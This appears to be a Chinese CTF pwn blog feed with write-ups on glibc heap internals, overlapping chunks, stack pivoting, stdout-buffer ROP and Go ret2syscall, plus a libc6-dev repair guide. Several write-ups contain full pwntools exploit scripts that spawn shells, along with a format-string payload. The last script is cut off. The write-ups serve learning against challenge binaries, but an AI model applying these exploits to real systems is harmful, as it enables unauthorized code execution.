class="line">#这里的req即是nb.对req的大小的检查，((<span class="type">unsigned</span> <span class="type">long</span>) (req)要小于 (<span class="type">unsigned</span> <span class="type">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"></span><br><span class="line"># 对nb加 SIZE_SZ加 MALLOC_ALIGN_MASK,最后和MALLOC_ALIGN_MASK按位与对齐,这里的SIZE_SZ是<span class="number">8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"><span class="meta"># req不能大于 -2 * MINSIZE，否则会报错</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) {                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    }                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></tbody></table></figure><h5 id="首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。"><a href="#首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。" class="headerlink" title="首先  ((unsigned long) (req) <= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))，即无符号的nb要小于无符号的  **-2  MINSIZE，即req不能大于-2MINSIZE*，一般都能满足条件。"></a>首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))，即无符号的nb要小于无符号的  **-2 </em> MINSIZE<strong>，即req不能大于</strong>-2<em>MINSIZE*</em>，一般都能满足条件。</h5><h5 id="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"><a href="#其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8" class="headerlink" title="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"></a>其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了</h5><p><code>MALLOC_ALIGN</code> 通常指的是内存块对齐的要求。如果req不对齐，不是0x0结尾的，需要多减掉8</p><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>只开了栈上的保护</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p><p>这里会把堆的地址给到v2的指针，后续会打印出来</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p><p>🐕Ⅷ题目，调试的时候完全不是题目逻辑，算了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="//posts/0/"/>
      <url>//posts/0/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>很简单的32位栈迁移，还留了个后门</p><p>这里获得栈地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p><p>把bin/sh的地址放返回地址后面就ok</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn"</span>,<span class="number">43744</span>)</span><br><span class="line"><span class="comment">#p=process("./short")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'username: '</span>,<span class="string">'admin'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'password: '</span>,<span class="string">'admin123'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">pop_edi=<span class="number">0x0804884a</span></span><br><span class="line">pop_ebx=<span class="number">0x08048411</span></span><br><span class="line">gift=<span class="number">0x080485E6</span></span><br><span class="line">leave=<span class="number">0x08048674</span></span><br><span class="line">binsh=<span class="number">0x0804A038</span> </span><br><span class="line">payload=p32(gift)+p32(<span class="number">0</span>)+p32(binsh)+<span class="string">b'a'</span>*<span class="number">68</span>+p32(stack-<span class="number">4</span>)+p32(leave)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"msg:"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>overlapping_chunks</title>
      <link href="//posts/37a70f1c/"/>
      <url>//posts/37a70f1c/</url>
      
        <content type="html"><![CDATA[<p>大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size.</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) {</span><br><span class="line">      prevsize = <span class="built_in">prev_size</span> (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">        <span class="built_in">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      <span class="built_in">unlink_chunk</span> (av, p);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护.</p><p>程序的最后有个格式化字符串漏洞，只能用一次，用于泄露libc和在fini的地方写上main函数地址</p><p>这里输入s是能写上栈的地方，这里输入fini的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p><p>算出偏移是13</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p><p>这里只强调构造的fake_chunk</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b'%2828c%13$hnkk%31$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b'b'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x151</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1d0</span>,<span class="string">b'\x41'</span>)+p64(<span class="number">0x150</span>)+p64(<span class="number">0x41</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>申请堆的过程中有堆溢出可以更改下一个 堆的size，改成下面特殊的堆的size，根据题目给大小改。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heapcreator</title>
      <link href="//posts/707c38cf/"/>
      <url>//posts/707c38cf/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>stdout</title>
      <link href="//posts/c2c94c1c/"/>
      <url>//posts/c2c94c1c/</url>
      
        <content type="html"><![CDATA[<p>这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显</p><p>刷新缓冲区有几种办法</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p><p>能够溢出8字节</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p><p>一个没什么用的函数</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p><p>那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p><p>ret的操作是pop rip，rsp=rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">payload=<span class="string">b'c'</span>*<span class="number">0x28</span>+p64(vul)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure><p>也只是让rbp+8移动</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p><p>第二次的rbp</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p><p>只是调用vuln的话时不会回显的。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p><p>其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。</p><p>调用extend时第二十次时的栈</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p><p>exp</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.31.so'</span>)</span><br><span class="line">extend=<span class="number">0x401287</span></span><br><span class="line">vul=<span class="number">0x40125D</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x58</span>+p64(vul)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">b'b'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">payload=<span class="string">b'c'</span>*<span class="number">0x28</span>+p64(extend)+p64(vul)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stdout???'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">base=puts_addr-<span class="number">0x10dfc0</span> <span class="comment">#libc.sym['puts']</span></span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+<span class="built_in">next</span>(libc.search(<span class="string">b'bin/sh'</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b'b'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'put'</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解决libc6软件包和libc6-dev不匹配的问题</title>
      <link href="//posts/24332419/"/>
      <url>//posts/24332419/</url>
      
        <content type="html"><![CDATA[<p>之前在学vm内核调试的时候，不小心把libc6-dev之类的包给删掉了，导致后面gcc编译不了，重新下载libc6-dev时，会弹出这样的报错，这种报错之前很常见。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下列软件包有未满足的依赖关系：</span><br><span class="line"> libc6-dev : 依赖: libc6 (= <span class="number">2.27</span>-3ubuntu1<span class="number">.6</span>) 但是 <span class="number">2.35</span>-0ubuntu3 正要被安装</span><br><span class="line">             依赖: libc-dev-<span class="built_in">bin</span> (= <span class="number">2.27</span>-3ubuntu1<span class="number">.6</span>)</span><br><span class="line">E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。</span><br></pre></td></tr></tbody></table></figure><p>最本质的原因就是已安装的libc6版本是2.35-0ubuntu3，但是要安装的libc6-dev所要的依赖是libc6和libc-dev-bin的版本都是2.27,当初想过把libc6降级的，因为libc6是软件包，有很多依赖关系，结果系统奔溃了，还刚好没提前拍快照，只有很久之前的。</p><p>libc6就是一个软件包名称，包含c标准库的所有功能，包含有很多库文件，如libc.so.6，是底层代码如prinf函数的实现。通常存放在/lib目录下，系统核心库的存放目录。</p><p>libc6-dev含有很多c标准库，如stdio.h,math.h.包含很多头文件。解压放到/usr/include/。</p><p>/usr/lib 目录是用户级库的存放目录，这些库文件是用户安装的软件包所需的，例如图形库、数据库库、开发库等。这些库文件通常是用户安装的软件包所需的，而不是系统核心组件所需的。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918204615913.png" alt="image-20240918204615913"></p><p>最正确的办法就是下载对应版本的libc6-dev.deb解压，要和已安装的libc6版本匹配，当时是直接找了网站<a href="http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/">glibc库</a> 下载libc6-dev.deb，但是找不到2.35版本的，后面终于在package.ubuntu.com找到,点这两个下载</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://packages.ubuntu.com/jammy/libc6-dev</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210634377.png" alt="image-20240918210634377"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210702629.png" alt="image-20240918210702629"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210853312.png" alt="image-20240918210853312"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211010603.png" alt="image-20240918211010603"></p><p>解压到/tmp/libc6-dev</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/libc6-dev</span><br><span class="line">dpkg-deb -x libc6-dev_2<span class="number">.35</span>-0ubuntu3<span class="number">.8</span>_amd64.deb /tmp/libc6-dev</span><br><span class="line">sudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/         <span class="comment">#移动头文件</span></span><br><span class="line">sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/             <span class="comment">#移动共享数据文件</span></span><br><span class="line"></span><br><span class="line">sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/                 <span class="comment">#移动用户级库文件，这里有一个小点。</span></span><br></pre></td></tr></tbody></table></figure><p>同理，libc-dev-bin也解压</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/libc-dev-<span class="built_in">bin</span></span><br><span class="line">dpkg-deb -x libc-dev-bin_2<span class="number">.35</span>-0ubuntu3<span class="number">.8</span>_amd64.deb /tmp/libc-dev-<span class="built_in">bin</span></span><br><span class="line">sudo rsync -av /tmp/libc-dev-<span class="built_in">bin</span>/usr/ /usr/                      <span class="comment">#主要是一些工具脚本</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>后面把tmp目录下的这两个临时文件删了就好。</p><p>后面我试着gcc编译的时候，还是遇见了个老错误</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211756419.png" alt="image-20240918211756419"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="number">1.</span>c -o <span class="number">1</span></span><br><span class="line">/usr/<span class="built_in">bin</span>/ld: 找不到 Scrt1.o: 没有那个文件或目录</span><br><span class="line">/usr/<span class="built_in">bin</span>/ld: 找不到 crti.o: 没有那个文件或目录</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> exit status</span><br></pre></td></tr></tbody></table></figure><p>通过查找发现，它在/tmp/libc6-dev/usr/lib/x86_64-linux-gnu 这个目录里，这个正是库文件的位置，把这些库文件移动到/usr/lib/x86_64-linux-gnu/目录就好</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211910349.png" alt="image-20240918211910349"></p><p>最后，编译成功</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918212931846.png" alt="image-20240918212931846"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc</title>
      <link href="//posts/58b6dd93/"/>
      <url>//posts/58b6dd93/</url>
      
        <content type="html"><![CDATA[<h3 id="手动下载glibc版本"><a href="#手动下载glibc版本" class="headerlink" title="手动下载glibc版本"></a>手动下载glibc版本</h3><p> 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下</p><p>可以到网站手动下载对应的./deb文件</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/</span><br></pre></td></tr></tbody></table></figure><p>在glibc-all-in-one目录下，若glibc版本名为x,用指令解压</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract ./x.deb ./libs/x</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gostack</title>
      <link href="//posts/ad559ced/"/>
      <url>//posts/ad559ced/</url>
      
        <content type="html"><![CDATA[<p>i 一个用go语言写的程序。</p><p> alt+f7用go_parser修复一下</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193439984.png" alt="image-20240912193439984"></p><p>主要的函数，只有一个输入点，因为是go语言写的，其反汇编也是很难看懂</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193707048.png" alt="image-20240912193707048"></p><p>主要看汇编,它后面会将输入的字符串复制到栈上</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194553878.png" alt="image-20240912194553878"></p><p>在scanner输入这里会检查这个位置的值是否为0</p><p>为了方便全都用0填充</p><p>脚本的具体调试是报错的，看不了，也只能分析个大概。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195104594.png" alt="image-20240913195104594"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195003832.png" alt="image-20240913195003832"></p><p>直接gdb</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194856414.png" alt="image-20240912194856414"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194938053.png" alt="image-20240912194938053"></p><p>算出距离rbp是0x1c8的距离。</p><p>这种题一般是用ret2syscall。而往年的国赛题也是ret2syscall居多。</p><p>找到的gadget</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912195323699.png" alt="image-20240912195323699"></p><p>syscall;ret是很难找到的。通过gadget找不到。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913194222552.png" alt="image-20240913194222552"></p><p>先sys_read在bss段输入bin/sh,再sys_execve.</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bss read</span></span><br><span class="line">payload=<span class="string">b'\x00'</span>*<span class="number">0x1d0</span>+p64(pop_rdi_r14)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#execve</span></span><br><span class="line">payload+=p64(pop_rdi_r14)+p64(bss)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall_ret)</span><br></pre></td></tr></tbody></table></figure><h5 id="同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size"><a href="#同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size" class="headerlink" title="同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size."></a>同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size.</h5><h5 id="sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0"><a href="#sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0" class="headerlink" title="sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0."></a>sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.</h5><h5 id="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"><a href="#前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。" class="headerlink" title="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"></a>前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28159</span>)</span><br><span class="line"><span class="comment">#p=process("./gostack")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#payload=b'a'*0x1d0+p64(0x4A0af6)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_r14=<span class="number">0x4a18a5</span></span><br><span class="line">pop_rax=<span class="number">0x40f984</span></span><br><span class="line">bss=<span class="number">0x5655C2</span></span><br><span class="line">pop_rsi=<span class="number">0x42138a</span></span><br><span class="line">pop_rdx=<span class="number">0x4944ec</span></span><br><span class="line">syscall_ret=<span class="number">0x4616C9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 